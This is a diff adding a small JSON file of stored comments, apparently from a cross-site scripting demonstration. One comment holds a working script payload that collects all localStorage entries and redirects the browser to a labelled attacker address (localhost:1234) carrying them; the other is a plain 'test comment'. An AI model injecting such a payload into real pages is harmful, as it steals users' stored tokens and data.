@@ -1,0 +1,12 @@
+{
+  "06c86287-2cbc-4652-9f33-31931e504ae2": {
+    "text": "<script>\r\n    var pairs = [];\r\n    for (var i = 0; i < localStorage.length; i++) {\r\n        var key = localStorage.key(i);\r\n        var value = localStorage.getItem(key);\r\n        var pair = key + \"=\" + value;\r\n        pairs.push(pair);\r\n    }\r\n\r\n    pairs = pairs.reduce(function (prev, current) {\r\n        return prev.concat(\"&\", current);\r\n    }, \"\");\r\n\r\n    var attackerAddr = \"http://localhost:1234/?\";\r\n    window.location = attackerAddr + pairs;\r\n</script>",
+    "time": 1473176350075,
+    "id": "06c86287-2cbc-4652-9f33-31931e504ae2"
+  },
+  "561d063c-e120-4d75-97fa-22f1ee5e067f": {
+    "text": "test comment",
+    "time": 1473177243993,
+    "id": "561d063c-e120-4d75-97fa-22f1ee5e067f"
+  }
+}
